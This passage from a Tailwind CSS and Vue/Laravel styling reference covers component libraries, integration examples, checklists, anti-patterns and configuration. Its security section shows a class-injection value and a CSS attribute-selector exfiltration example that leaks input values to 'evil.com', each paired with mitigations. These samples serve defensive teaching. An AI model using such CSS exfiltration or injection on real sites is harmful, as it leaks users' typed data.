**Installation:**
```bash
npm install @vueuse/core
```

**Essential Composables for UI:**
- `useColorMode` - Dark mode toggle
- `useScroll` - Scroll position tracking
- `useIntersectionObserver` - Lazy loading, infinite scroll
- `useElementSize` - Responsive components
- `useClipboard` - Copy to clipboard
- `useDraggable` - Drag and drop
- `useDropZone` - File drop zones
- `useFullscreen` - Fullscreen API
- `useMediaQuery` - Responsive hooks
- `useStorage` - LocalStorage/SessionStorage

#### Floating UI

**Installation:**
```bash
npm install @floating-ui/vue
```

**Features:** Position floating elements (tooltips, popovers, dropdowns).

### Recommended Stack for Laravel/Inertia/Vue Projects

**Tier 1 - Essential:**
1. **HeadlessUI** - Accessible components (Dialog, Menu, Listbox)
2. **Heroicons** - Icon set
3. **VueUse** - Utility composables

**Tier 2 - Enhanced UX:**
4. **Shadcn-vue** - Copy-paste components (when needed)
5. **Auto-Animate** - Smooth list animations
6. **VueDatePicker** - Date/time inputs

**Tier 3 - Data-Heavy Apps:**
7. **TanStack Table** - Advanced data tables
8. **Chart.js + vue-chartjs** - Visualizations
9. **VeeValidate + Zod** - Form validation

### Installation Quick Reference

```bash
# Essential
npm install @headlessui/vue @heroicons/vue @vueuse/core

# Shadcn-vue setup
npx shadcn-vue@latest init
npx shadcn-vue@latest add button card dialog input form table

# DaisyUI (if semantic classes preferred)
npm install daisyui

# Forms and validation
npm install vee-validate @vee-validate/zod zod

# Data tables
npm install @tanstack/vue-table

# Charts
npm install chart.js vue-chartjs

# Date picker
npm install @vuepic/vue-datepicker

# Animations
npm install @formkit/auto-animate
```

## Integration Guides

### Integration with Vue.js Components

**When to integrate:**
- Styling Vue SFC components
- Using scoped styles with Tailwind
- Dynamic class binding

**Setup:**
```vue
<!-- Use class binding with Tailwind -->
<script setup>
import { computed } from 'vue';

const props = defineProps({
  variant: {
    type: String,
    default: 'primary'
  },
  size: {
    type: String,
    default: 'md'
  }
});

const buttonClasses = computed(() => ({
  // Base classes
  'inline-flex items-center justify-center font-medium rounded-lg transition-colors': true,

  // Size variants
  'px-3 py-1.5 text-sm': props.size === 'sm',
  'px-4 py-2 text-base': props.size === 'md',
  'px-6 py-3 text-lg': props.size === 'lg',

  // Color variants
  'bg-primary-600 text-white hover:bg-primary-700': props.variant === 'primary',
  'bg-gray-200 text-gray-800 hover:bg-gray-300': props.variant === 'secondary',
  'bg-red-600 text-white hover:bg-red-700': props.variant === 'danger',
}));
</script>

<template>
  <button :class="buttonClasses">
    <slot />
  </button>
</template>
```

**Scoped styles with Tailwind:**
```vue
<style scoped>
/* Use @apply for component-specific styles */
.custom-card {
  @apply bg-white rounded-xl shadow-lg p-6;
  @apply dark:bg-gray-800;
}

/* Deep selectors for child components */
:deep(.prose) {
  @apply text-gray-700 dark:text-gray-300;
}

/* Slot content styling */
:slotted(p) {
  @apply mb-4 last:mb-0;
}
</style>
```

### Integration with Laravel Blade

**When to integrate:**
- Server-rendered pages
- Blade components with Tailwind
- Inline styling for emails

**Component with Tailwind:**
```blade
{{-- resources/views/components/alert.blade.php --}}
@props([
    'type' => 'info',
    'dismissible' => false
])

@php
$classes = match($type) {
    'success' => 'bg-green-50 border-green-200 text-green-800',
    'warning' => 'bg-yellow-50 border-yellow-200 text-yellow-800',
    'error' => 'bg-red-50 border-red-200 text-red-800',
    default => 'bg-blue-50 border-blue-200 text-blue-800',
};

$iconClasses = match($type) {
    'success' => 'text-green-500',
    'warning' => 'text-yellow-500',
    'error' => 'text-red-500',
    default => 'text-blue-500',
};
@endphp

<div {{ $attributes->merge(['class' => "flex items-start gap-3 p-4 border rounded-lg $classes"]) }}>
    <svg class="w-5 h-5 flex-shrink-0 {{ $iconClasses }}">...</svg>
    <div class="flex-1">{{ $slot }}</div>
    @if($dismissible)
        <button class="text-gray-400 hover:text-gray-600" onclick="this.closest('[role=alert]').remove()">
            <svg class="w-4 h-4">...</svg>
        </button>
    @endif
</div>
```

**Usage:**
```blade
<x-alert type="success" dismissible>
    Your changes have been saved!
</x-alert>
```

### Integration with PostCSS Plugins

**Setup:**
```javascript
// postcss.config.js
module.exports = {
  plugins: {
    'tailwindcss/nesting': {},  // CSS nesting support
    tailwindcss: {},
    autoprefixer: {},
    ...(process.env.NODE_ENV === 'production' ? { cssnano: {} } : {})
  },
}
```

**Using CSS nesting:**
```css
/* resources/css/app.css */
@tailwind base;
@tailwind components;
@tailwind utilities;

@layer components {
  .card {
    @apply bg-white rounded-xl shadow-lg;

    &-header {
      @apply px-6 py-4 border-b border-gray-100;
    }

    &-body {
      @apply p-6;
    }

    &-footer {
      @apply px-6 py-4 bg-gray-50 rounded-b-xl;
    }
  }
}
```

### Integration with HeadlessUI

**When to integrate:**
- Accessible modal, dropdown, combobox components
- Keyboard navigation support
- ARIA attributes handled automatically

**Example with Tailwind:**
```vue
<script setup>
import {
  Dialog,
  DialogPanel,
  DialogTitle,
  TransitionRoot,
  TransitionChild
} from '@headlessui/vue';

const isOpen = ref(false);
</script>

<template>
  <TransitionRoot :show="isOpen" as="template">
    <Dialog @close="isOpen = false" class="relative z-50">
      <!-- Backdrop -->
      <TransitionChild
        enter="ease-out duration-300"
        enter-from="opacity-0"
        enter-to="opacity-100"
        leave="ease-in duration-200"
        leave-from="opacity-100"
        leave-to="opacity-0"
      >
        <div class="fixed inset-0 bg-black/30 backdrop-blur-sm" />
      </TransitionChild>

      <!-- Modal -->
      <div class="fixed inset-0 flex items-center justify-center p-4">
        <TransitionChild
          enter="ease-out duration-300"
          enter-from="opacity-0 scale-95"
          enter-to="opacity-100 scale-100"
          leave="ease-in duration-200"
          leave-from="opacity-100 scale-100"
          leave-to="opacity-0 scale-95"
        >
          <DialogPanel class="bg-white rounded-xl shadow-xl max-w-md w-full p-6">
            <DialogTitle class="text-lg font-semibold text-gray-900">
              Modal Title
            </DialogTitle>
            <!-- Content -->
          </DialogPanel>
        </TransitionChild>
      </div>
    </Dialog>
  </TransitionRoot>
</template>
```

## Checklists

### Pre-Implementation Checklist

Before starting CSS/styling work:

- [ ] Review design specifications/mockups
- [ ] Identify existing components that can be reused
- [ ] Check Tailwind config for existing design tokens
- [ ] Plan responsive breakpoints needed
- [ ] Identify accessibility requirements (focus states, contrast)
- [ ] Determine if dark mode support is needed
- [ ] Check for animation/transition requirements
- [ ] Review browser support requirements

### Component Styling Checklist

When styling a component:

- [ ] Use Tailwind utilities first, custom CSS only if needed
- [ ] Apply mobile-first responsive design
- [ ] Add hover, focus, and active states
- [ ] Include dark mode variants where applicable
- [ ] Ensure sufficient color contrast (WCAG AA: 4.5:1)
- [ ] Add focus-visible states for keyboard navigation
- [ ] Test with different content lengths
- [ ] Verify animations respect reduced-motion preference
- [ ] Use semantic HTML elements where possible
- [ ] Add appropriate ARIA attributes if needed

### Responsive Design Checklist

For responsive layouts:

- [ ] Start with mobile layout (base styles)
- [ ] Add `sm:` styles for small screens (640px+)
- [ ] Add `md:` styles for medium screens (768px+)
- [ ] Add `lg:` styles for large screens (1024px+)
- [ ] Add `xl:` and `2xl:` for extra large screens if needed
- [ ] Test touch targets are at least 44x44px on mobile
- [ ] Verify text remains readable at all sizes
- [ ] Check for horizontal overflow issues
- [ ] Test navigation menu behavior on all sizes
- [ ] Verify modals/dropdowns work on mobile

### Post-Implementation Checklist

After completing styling:

- [ ] Test in Chrome, Firefox, Safari (and Edge if required)
- [ ] Test on actual mobile devices
- [ ] Verify dark mode works correctly
- [ ] Run accessibility audit (Lighthouse, axe)
- [ ] Check performance (no layout thrashing)
- [ ] Verify animations are smooth (60fps)
- [ ] Ensure no console warnings/errors
- [ ] Check bundle size impact
- [ ] Verify print styles if applicable
- [ ] Document any custom classes added

## Common Mistakes & Anti-Patterns

### Mistake 1: Overusing @apply

**The Problem:**
```css
/* Creating component classes for everything */
.btn {
  @apply inline-flex items-center justify-center px-4 py-2 text-sm font-medium rounded-lg;
}

.btn-primary {
  @apply bg-primary-600 text-white hover:bg-primary-700;
}

.card {
  @apply bg-white rounded-xl shadow-lg p-6;
}

/* Now you've just recreated traditional CSS */
```

**Why It's Wrong:**
- Loses Tailwind's main benefit (styles in markup)
- Creates abstraction that may not be needed
- Harder to see what styles are applied
- Bundle size can grow unexpectedly

**The Fix:**
```html
<!-- Use utilities directly in markup -->
<button class="inline-flex items-center justify-center px-4 py-2 text-sm font-medium rounded-lg bg-primary-600 text-white hover:bg-primary-700">
  Button
</button>

<!-- Extract to component only when truly reusable -->
<!-- In Vue/React, use component props instead of CSS classes -->
```

**When @apply IS appropriate:**
- Third-party library overrides
- Complex pseudo-element styles
- Truly repeated patterns (but consider component extraction first)

### Mistake 2: Fighting Specificity with !important

**The Problem:**
```css
.my-button {
  background-color: blue !important;
  color: white !important;
  padding: 1rem !important;
}
```

**Why It's Wrong:**
- Creates specificity wars
- Makes styles harder to override
- Indicates underlying architecture issues

**The Fix:**
```html
<!-- Use Tailwind's ! prefix sparingly and only when needed -->
<div class="!bg-blue-500">Only when overriding third-party</div>

<!-- Better: Fix the source of the conflict -->
<!-- Use more specific selectors or restructure -->
```

### Mistake 3: Inline Styles Mixed with Tailwind

**The Problem:**
```html
<div class="p-4 bg-white rounded-lg" style="margin-top: 20px; border: 1px solid #ccc;">
  Mixed approach
</div>
```

**Why It's Wrong:**
- Inconsistent styling approach
- Loses design system benefits
- Harder to maintain

**The Fix:**
```html
<!-- Use Tailwind for everything or use CSS variables -->
<div class="p-4 bg-white rounded-lg mt-5 border border-gray-300">
  Consistent approach
</div>

<!-- For truly dynamic values -->
<div class="p-4 bg-white rounded-lg" :style="{ marginTop: `${dynamicValue}px` }">
  Dynamic when needed
</div>
```

### Mistake 4: Not Using Design Tokens

**The Problem:**
```html
<!-- Magic numbers everywhere -->
<div class="p-[23px] mt-[17px] text-[#1a1a1a] bg-[#f5f5f5]">
  Inconsistent spacing and colors
</div>
```

**Why It's Wrong:**
- No consistency across the app
- Hard to make global changes
- Loses design system benefits

**The Fix:**
```javascript
// tailwind.config.js
module.exports = {
  theme: {
    extend: {
      colors: {
        'brand': {
          50: '#f5f5f5',
          900: '#1a1a1a',
        }
      },
      spacing: {
        '18': '4.5rem',
        '22': '5.5rem',
      }
    }
  }
}
```

```html
<div class="p-6 mt-4 text-brand-900 bg-brand-50">
  Using design tokens
</div>
```

### Mistake 5: Ignoring Mobile-First

**The Problem:**
```html
<!-- Desktop-first (wrong approach) -->
<div class="flex flex-row lg:flex-col md:flex-col sm:flex-col">
  <!-- Fighting against mobile-first -->
</div>
```

**Why It's Wrong:**
- More CSS generated
- Harder to reason about
- Against Tailwind's design

**The Fix:**
```html
<!-- Mobile-first (correct approach) -->
<div class="flex flex-col lg:flex-row">
  <!-- Base: mobile (column), Large screens: row -->
</div>
```

### Mistake 6: Forgetting Focus States

**The Problem:**
```html
<button class="bg-blue-500 hover:bg-blue-600">
  No focus state!
</button>
```

**Why It's Wrong:**
- Keyboard users can't see focus
- Accessibility violation
- Poor user experience

**The Fix:**
```html
<button class="bg-blue-500 hover:bg-blue-600 focus:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-offset-2">
  Accessible button
</button>

<!-- Or use a consistent pattern -->
<button class="bg-blue-500 hover:bg-blue-600 focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
  Accessible button
</button>
```

### Mistake 7: Animating Layout Properties

**The Problem:**
```html
<div class="transition-all hover:w-64 hover:h-64 hover:p-8">
  Janky animation
</div>
```

**Why It's Wrong:**
- Causes layout recalculation (expensive)
- Janky 30fps animations
- Poor performance on mobile

**The Fix:**
```html
<!-- Use transform instead -->
<div class="transition-transform hover:scale-110">
  Smooth 60fps animation
</div>

<!-- For size changes, use scale -->
<div class="w-32 h-32 transition-transform hover:scale-150 origin-center">
  Grows smoothly
</div>
```

### Mistake 8: Not Testing Dark Mode

**The Problem:**
```html
<div class="bg-white text-gray-900">
  <span class="text-gray-500">
    <!-- Forgot dark: variants -->
  </span>
</div>
```

**Why It's Wrong:**
- Broken experience for dark mode users
- Invisible or unreadable text
- Inconsistent UI

**The Fix:**
```html
<div class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white">
  <span class="text-gray-500 dark:text-gray-400">
    Properly themed text
  </span>
</div>
```

### Mistake 9: Overriding Tailwind with Custom CSS

**The Problem:**
```css
/* Fighting against Tailwind */
.my-button {
  padding: 12px 24px !important;
  background-color: blue !important;
  border-radius: 8px !important;
}
```

**Why It's Wrong:**
- Creates specificity wars
- Hard to maintain
- Negates Tailwind's benefits

**The Fix:**
```javascript
// tailwind.config.js
module.exports = {
  theme: {
    extend: {
      spacing: {
        '4.5': '1.125rem', // Custom spacing if needed
      }
    }
  }
}
```

```html
<!-- Use Tailwind utilities or extend config -->
<button class="px-6 py-3 bg-blue-500 rounded-lg">
  Using Tailwind properly
</button>
```

### Mistake 10: Using Fixed Pixel Values

**The Problem:**
```html
<div class="w-[347px] h-[892px] ml-[23px] text-[17px]">
  Magic pixel values everywhere
</div>
```

**Why It's Wrong:**
- Not responsive
- Inconsistent with design system
- Harder to maintain

**The Fix:**
```html
<!-- Use Tailwind's scale or relative units -->
<div class="w-full max-w-md h-auto ml-6 text-lg">
  Using design system values
</div>

<!-- If custom values are truly needed, add to config -->
```

```javascript
// tailwind.config.js
module.exports = {
  theme: {
    extend: {
      width: {
        'card': '22rem', // Named value instead of magic number
      }
    }
  }
}
```

### Mistake 11: Inconsistent Spacing

**The Problem:**
```html
<div class="p-4">
  <h1 class="mb-3">Title</h1>
  <p class="mb-7">Text</p>
  <button class="mt-5">Click</button>
</div>
```

**Why It's Wrong:**
- Visual inconsistency
- No rhythm to layout
- Hard to maintain design system

**The Fix:**
```html
<!-- Use consistent spacing scale -->
<div class="p-6 space-y-4">
  <h1>Title</h1>
  <p>Text</p>
  <button class="mt-6">Click</button>
</div>

<!-- Or use a section-based approach -->
<div class="p-6">
  <header class="mb-6">...</header>
  <main class="space-y-4">...</main>
  <footer class="mt-8">...</footer>
</div>
```

### Mistake 12: Nesting Flexbox Without Need

**The Problem:**
```html
<div class="flex">
  <div class="flex">
    <div class="flex">
      <div class="flex items-center">
        <!-- Over-nested flexbox -->
      </div>
    </div>
  </div>
</div>
```

**Why It's Wrong:**
- Unnecessary complexity
- Performance overhead
- Harder to debug

**The Fix:**
```html
<!-- Flatten where possible -->
<div class="flex items-center gap-4">
  <img src="..." class="w-10 h-10 rounded-full" />
  <div>
    <h3 class="font-semibold">Name</h3>
    <p class="text-sm text-gray-500">Role</p>
  </div>
</div>

<!-- Use grid for complex layouts -->
<div class="grid grid-cols-[auto_1fr_auto] items-center gap-4">
  <!-- Cleaner than nested flex -->
</div>
```

### Mistake 13: Not Using Semantic HTML

**The Problem:**
```html
<div class="cursor-pointer" onclick="...">Click me</div>
<div class="text-2xl font-bold">Title</div>
<div class="list-disc pl-4">• Item</div>
```

**Why It's Wrong:**
- Accessibility issues
- Missing keyboard support
- SEO problems

**The Fix:**
```html
<button class="cursor-pointer">Click me</button>
<h2 class="text-2xl font-bold">Title</h2>
<ul class="list-disc pl-4">
  <li>Item</li>
</ul>

<!-- Navigation -->
<nav aria-label="Main navigation">
  <ul class="flex gap-4">
    <li><a href="/">Home</a></li>
  </ul>
</nav>
```

### Mistake 14: Forgetting Hover/Focus Pairs

**The Problem:**
```html
<a class="text-blue-500 hover:text-blue-700">
  <!-- No focus state -->
</a>
```

**Why It's Wrong:**
- Keyboard users can't see focus
- Accessibility violation
- Incomplete interaction design

**The Fix:**
```html
<a class="text-blue-500 hover:text-blue-700 focus:text-blue-700 focus:outline-none focus-visible:ring-2 focus-visible:ring-blue-500">
  Accessible link
</a>

<!-- For buttons -->
<button class="bg-primary-500 hover:bg-primary-600 focus:bg-primary-600
               focus:outline-none focus-visible:ring-2 focus-visible:ring-primary-500 focus-visible:ring-offset-2">
  Accessible button
</button>
```

### Mistake 15: Using Color Names Directly

**The Problem:**
```html
<div class="bg-blue-500 border-blue-600 text-blue-50">
  <!-- Hardcoded blue everywhere -->
</div>
```

**Why It's Wrong:**
- Brand color changes require find/replace
- No semantic meaning
- Inconsistent shades across app

**The Fix:**
```javascript
// tailwind.config.js
module.exports = {
  theme: {
    extend: {
      colors: {
        primary: {
          50: '#eff6ff',
          500: '#3b82f6',
          600: '#2563eb',
          // ...
        }
      }
    }
  }
}
```

```html
<div class="bg-primary-500 border-primary-600 text-primary-50">
  <!-- Semantic color names -->
</div>
```

### Mistake 16: Not Handling Empty States

**The Problem:**
```html
<div class="grid grid-cols-3 gap-4">
  <!-- What if items is empty? -->
</div>
```

**Why It's Wrong:**
- Blank page for users
- No guidance on next steps
- Poor user experience

**The Fix:**
```html
<div v-if="items.length === 0" class="flex flex-col items-center justify-center py-12 text-center">
  <svg class="w-16 h-16 text-gray-400 mb-4">...</svg>
  <h3 class="text-lg font-medium text-gray-900">No items yet</h3>
  <p class="text-gray-500 mt-1">Get started by creating your first item.</p>
  <button class="mt-4 btn-primary">Create Item</button>
</div>

<div v-else class="grid grid-cols-3 gap-4">
  <!-- Items here -->
</div>
```

### Mistake 17: Z-Index Chaos

**The Problem:**
```html
<div class="z-50">Header</div>
<div class="z-[9999]">Modal</div>
<div class="z-[99999]">Tooltip</div>
<div class="z-[999999]">Dropdown</div>
```

**Why It's Wrong:**
- Unpredictable stacking
- Constant escalation
- Hard to debug

**The Fix:**
```javascript
// tailwind.config.js - Define a z-index scale
module.exports = {
  theme: {
    extend: {
      zIndex: {
        'dropdown': '10',
        'sticky': '20',
        'header': '30',
        'overlay': '40',
        'modal': '50',
        'toast': '60',
        'tooltip': '70',
      }
    }
  }
}
```

```html
<header class="sticky top-0 z-header">...</header>
<div class="z-overlay">Backdrop</div>
<div class="z-modal">Modal</div>
<div class="z-tooltip">Tooltip</div>
```

### Mistake 18: Not Optimizing for Production

**The Problem:**
```javascript
// tailwind.config.js
module.exports = {
  content: ['./src/**/*'], // Too broad
  safelist: ['bg-red-500', 'bg-blue-500', ...], // Massive safelist
}
```

**Why It's Wrong:**
- Huge CSS bundle size
- Slow page load
- Including unused styles

**The Fix:**
```javascript
// tailwind.config.js
module.exports = {
  content: [
    './resources/**/*.blade.php',
    './resources/**/*.js',
    './resources/**/*.vue',
  ],
  // Only safelist truly dynamic classes
  safelist: [
    {
      pattern: /bg-(red|green|blue|yellow)-(100|500)/,
      variants: ['hover'],
    },
  ],
}
```

```bash
# Check bundle size
npx tailwindcss -o output.css --minify
du -h output.css
```

## Security Considerations

### Security Risk 1: User-Generated Content in Classes

**Vulnerability:**
Allowing user input in class attributes can enable CSS injection.

**Attack Vector:**
```html
<!-- User input as class -->
<div :class="userInput">Content</div>

<!-- Malicious input -->
userInput = "bg-blue-500} body{display:none}{"
```

**Mitigation:**
```javascript
// Whitelist allowed classes
const allowedColors = ['red', 'green', 'blue', 'yellow'];

const safeColor = allowedColors.includes(userColor)
  ? userColor
  : 'gray';

// Use predefined mappings
const colorMap = {
  primary: 'bg-primary-500',
  success: 'bg-green-500',
  danger: 'bg-red-500',
};

const safeClass = colorMap[userInput] || colorMap.primary;
```

**Validation:**
- Never interpolate user input directly into classes
- Use whitelisted values only
- Sanitize any dynamic class names

### Security Risk 2: Third-Party CSS

**Vulnerability:**
Including untrusted CSS can enable data exfiltration.

**Attack Vector:**
```css
/* Malicious CSS */
input[value^="a"] { background: url('https://evil.com/log?char=a'); }
input[value^="b"] { background: url('https://evil.com/log?char=b'); }
/* ... can leak input values character by character */
```

**Mitigation:**
```html
<!-- Use Content Security Policy -->
<meta http-equiv="Content-Security-Policy"
      content="style-src 'self' 'unsafe-inline';">
```

```javascript
// Only include trusted CSS sources
// Review any third-party CSS before including
```

**Validation:**
- Audit third-party CSS libraries
- Use CSP to restrict style sources
- Prefer building components over including CSS frameworks

## Configuration Reference

### Tailwind Configuration
```javascript
// tailwind.config.js
const defaultTheme = require('tailwindcss/defaultTheme');

/** @type {import('tailwindcss').Config} */
module.exports = {
  content: [
    './vendor/laravel/framework/src/Illuminate/Pagination/resources/views/*.blade.php',
    './storage/framework/views/*.php',
    './resources/views/**/*.blade.php',
    './resources/js/**/*.vue',
  ],

  darkMode: 'class',

  theme: {
    extend: {
      // Custom colors
      colors: {
        primary: {
          50: '#eff6ff',
          100: '#dbeafe',
          200: '#bfdbfe',
          300: '#93c5fd',
          400: '#60a5fa',
          500: '#3b82f6',
          600: '#2563eb',
          700: '#1d4ed8',
          800: '#1e40af',
          900: '#1e3a8a',
          950: '#172554',
        },
      },

      // Custom fonts
      fontFamily: {
        sans: ['Inter var', ...defaultTheme.fontFamily.sans],
      },

      // Custom spacing
      spacing: {
        '18': '4.5rem',
        '88': '22rem',
        '128': '32rem',
      },

      // Custom breakpoints
      screens: {
        'xs': '475px',
        ...defaultTheme.screens,
        '3xl': '1920px',
      },

      // Animation
      animation: {
        'fade-in': 'fadeIn 0.3s ease-out',
        'slide-up': 'slideUp 0.3s ease-out',
        'slide-down': 'slideDown 0.3s ease-out',
      },
      keyframes: {
        fadeIn: {
          '0%': { opacity: '0' },
          '100%': { opacity: '1' },
        },
        slideUp: {
          '0%': { transform: 'translateY(10px)', opacity: '0' },
          '100%': { transform: 'translateY(0)', opacity: '1' },
        },
        slideDown: {
          '0%': { transform: 'translateY(-10px)', opacity: '0' },
          '100%': { transform: 'translateY(0)', opacity: '1' },
        },
      },
    },
  },

  plugins: [
    require('@tailwindcss/forms'),
    require('@tailwindcss/typography'),
    require('@tailwindcss/aspect-ratio'),
    require('@tailwindcss/container-queries'),
  ],
};
```

### PostCSS Configuration
```javascript
// postcss.config.js
module.exports = {
  plugins: {
    'tailwindcss/nesting': 'postcss-nesting',
    tailwindcss: {},
    autoprefixer: {},
    ...(process.env.NODE_ENV === 'production' ? {
      cssnano: {
        preset: ['default', {
          discardComments: { removeAll: true },
        }],
      },
    } : {}),
  },
};
```

### CSS Entry Point
```css
/* resources/css/app.css */
@tailwind base;
@tailwind components;
@tailwind utilities;

/* Custom base styles */
@layer base {
  html {
    @apply scroll-smooth;
  }

  body {
    @apply antialiased;
  }

  /* Custom focus styles */
  :focus-visible {
    @apply outline-none ring-2 ring-primary-500 ring-offset-2;
  }
}

/* Custom component styles */
@layer components {
  .btn {
    @apply inline-flex items-center justify-center px-4 py-2;
    @apply text-sm font-medium rounded-lg;
    @apply transition-colors duration-200;
    @apply focus:outline-none focus-visible:ring-2 focus-visible:ring-offset-2;
  }

  .input {
    @apply block w-full rounded-lg border-gray-300;
    @apply focus:border-primary-500 focus:ring-primary-500;
    @apply dark:bg-gray-800 dark:border-gray-700;
  }
}

/* Custom utilities */
@layer utilities {
  .text-balance {
    text-wrap: balance;
  }
}
```

## Tools & Commands Quick Reference

```bash
# Development
npm run dev              # Start Vite with HMR
npm run build            # Build for production

# Tailwind CLI (if not using Vite)
npx tailwindcss -i ./src/input.css -o ./dist/output.css --watch
npx tailwindcss -i ./src/input.css -o ./dist/output.css --minify

# Check bundle size
npx tailwindcss --content "./src/**/*.html" --output ./dist/output.css
du -h ./dist/output.css

# Generate Tailwind config
npx tailwindcss init
npx tailwindcss init --full  # With all defaults

# Upgrade Tailwind
npm install -D tailwindcss@latest postcss@latest autoprefixer@latest

# Debug: Find unused classes
# (No official tool, but consider PurgeCSS reports)
```

## Resources & Documentation

### Official Documentation
- [Tailwind CSS Documentation](https://tailwindcss.com/docs) - Complete reference
- [Tailwind UI](https://tailwindui.com/) - Official component library
- [Heroicons](https://heroicons.com/) - SVG icons by Tailwind team
- [HeadlessUI](https://headlessui.com/) - Unstyled accessible components

### Related Skills
- `javascript-vuejs-expert` - Vue component styling patterns
- `webdesign` - Laravel/Inertia design patterns
- `flutter-dart-expert` - Mobile styling (different paradigm)

### External Tools
- [Tailwind CSS IntelliSense](https://marketplace.visualstudio.com/items?itemName=bradlc.vscode-tailwindcss) - VS Code extension
- [Tailwind Play](https://play.tailwindcss.com/) - Online playground
- [Hypercolor](https://hypercolor.dev/) - Gradient generator
- [Tailwind Color Shades](https://www.tailwindshades.com/) - Color palette generator

### Community Resources
- [Awesome Tailwind CSS](https://github.com/aniftyco/awesome-tailwindcss) - Curated resources
- [Tailwind Discord](https://discord.com/invite/tailwindcss) - Official community
- [Tailwind Weekly](https://tailwindweekly.com/) - Newsletter

## Version History & Updates

### Version 1.0.0 (2025-12-15)
- Initial comprehensive skill creation
- Covers CSS3, Tailwind CSS, responsive design
- Includes troubleshooting, security, and best practices

### Known Limitations

1. **Tailwind v4 Alpha Features**
   - Some v4 features may change before stable release
   - Workaround: Check Tailwind docs for latest syntax

2. **Browser-Specific Issues**
   - Some CSS features have limited browser support
   - Check caniuse.com for specific features

## Appendices

### Appendix A: Glossary

| Term | Definition |
|------|------------|
| JIT | Just-in-Time compilation - generates CSS on demand |
| Utility-first | Approach using small, single-purpose classes |
| Design tokens | Reusable design values (colors, spacing, etc.) |
| PurgeCSS | Tool that removes unused CSS |
| CSS Custom Properties | Native CSS variables (--variable-name) |
| Stacking context | Isolation layer for z-index positioning |
| Reflow | Browser recalculating element positions (expensive) |
| Repaint | Browser redrawing pixels (less expensive than reflow) |

### Appendix B: Decision Trees

**Should I use Tailwind or custom CSS?**
- If it's a standard pattern → Use Tailwind utilities
- If it needs complex selectors → Consider custom CSS
- If it's repeated 3+ times → Extract to component
- If it's truly unique → Use arbitrary values `[value]`

**Which layout method should I use?**
- If one-dimensional (row OR column) → Use Flexbox
- If two-dimensional (rows AND columns) → Use Grid
- If simple centering → Use Flexbox or Grid with place-items
- If complex alignment → Use Grid with named areas

**Should I animate with CSS or JavaScript?**
- If simple state change → CSS transition
- If complex keyframe sequence → CSS animation
- If needs precise control → JavaScript (GSAP)
- If scroll-linked → Use Intersection Observer + CSS

### Appendix C: Breakpoint Reference

| Breakpoint | Min Width | Tailwind Prefix | Common Devices |
|------------|-----------|-----------------|----------------|
| Default | 0px | (none) | Small phones |
| sm | 640px | `sm:` | Large phones |
| md | 768px | `md:` | Tablets |
| lg | 1024px | `lg:` | Small laptops |
| xl | 1280px | `xl:` | Desktops |
| 2xl | 1536px | `2xl:` | Large desktops |

### Appendix D: Color Contrast Requirements

| WCAG Level | Ratio | Use Case |
|------------|-------|----------|
| AA (Normal text) | 4.5:1 | Body text, labels |
| AA (Large text) | 3:1 | Headings 18px+ |
| AAA (Normal text) | 7:1 | Enhanced accessibility |
| UI Components | 3:1 | Buttons, inputs, icons |

**Quick reference for Tailwind grays on white:**
- `text-gray-500` on white: ~4.6:1 (AA pass)
- `text-gray-600` on white: ~5.7:1 (AA pass)
- `text-gray-400` on white: ~3.0:1 (AA fail for small text)

---

## Appendix E: 2025-2026 Web Design Trends

**Last Updated:** December 2025

This section documents the most important CSS/Tailwind web design trends for 2025-2026.

### Visual Style Trends

#### 1. Glassmorphism 2.0

Frosted glass effects with backdrop blur. Use subtle transparency for "calm futurism."

```css
/* CSS */
.glass-card {
  background: rgba(255, 255, 255, 0.15);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid rgba(255, 255, 255, 0.2);
  border-radius: 16px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
}
```

```html
<!-- Tailwind -->
<div class="bg-white/15 backdrop-blur-xl border border-white/20 rounded-2xl shadow-lg">
  Content
</div>
```

#### 2. Neumorphism 2.0

Soft, extruded elements with dual shadows. Use sparingly due to accessibility concerns.

```css
.neumorphic {
  background: #e0e5ec;
  border-radius: 12px;
  box-shadow:
    6px 6px 12px rgba(163, 177, 198, 0.6),
    -6px -6px 12px rgba(255, 255, 255, 0.8);
}
```

#### 3. Bento Grid Layouts

Modular, asymmetric grids popularized by Apple and Samsung.

```html
<!-- Tailwind -->
<div class="grid grid-cols-4 auto-rows-[minmax(120px,auto)] gap-4">
  <div class="col-span-2 row-span-2">Large</div>
  <div class="col-span-2">Wide</div>
  <div class="row-span-2">Tall</div>
</div>
```

### Color & Gradient Trends

#### 4. Bold & Saturated Colors

```css
:root {
  --electric-blue: #3B82F6;
  --fiery-red: #EF4444;
  --vivid-orange: #F97316;
  --fuchsia-pink: #D946EF;
  --emerald-green: #10B981;
}
```

#### 5. Aurora Gradients

```css
.aurora {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #6B8DD6 50%, #8E37D7 75%, #667eea 100%);
  background-size: 400% 400%;
  animation: aurora 15s ease infinite;
}

@keyframes aurora {
  0%, 100% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
}
```

### Animation Trends

#### 6. Micro-Delight Animations

```html
<!-- Tailwind -->
<button class="transform transition-transform duration-200 hover:scale-[1.02] active:scale-95">
  Click me
</button>
```

#### 7. Spring/Elastic Easing

```css
.spring {
  transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
}
```

### Accessibility (Critical for 2025)

#### 8. WCAG 2.2 New Requirements

Required by European Accessibility Act (June 2025).

```css
/* Target size minimum 24x24px */
.accessible-target {
  min-width: 24px;
  min-height: 24px;
}

/* Focus must not be obscured */
*:focus-visible {
  outline: 2px solid #3B82F6;
  outline-offset: 2px;
  z-index: 1;
}
```

#### 9. Prefers Reduced Motion

```css
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.01ms !important;
    transition-duration: 0.01ms !important;
  }
}
```

```html
<!-- Tailwind v3.4+ -->
<div class="motion-safe:animate-bounce motion-reduce:animate-none">
</div>
```

### Dark Mode Trends

#### 10. True Dark Mode (OLED-Optimized)

```css
.dark {
  --bg-primary: #000000;      /* True black */
  --bg-secondary: #0a0a0a;
  --bg-elevated: #121212;
  --text-primary: #e5e5e5;
}
```

```html
<!-- Tailwind -->
<div class="bg-white dark:bg-black text-slate-900 dark:text-gray-100">
</div>
```

### Typography Trends

#### 11. Variable Fonts

```css
@font-face {
  font-family: 'Inter Variable';
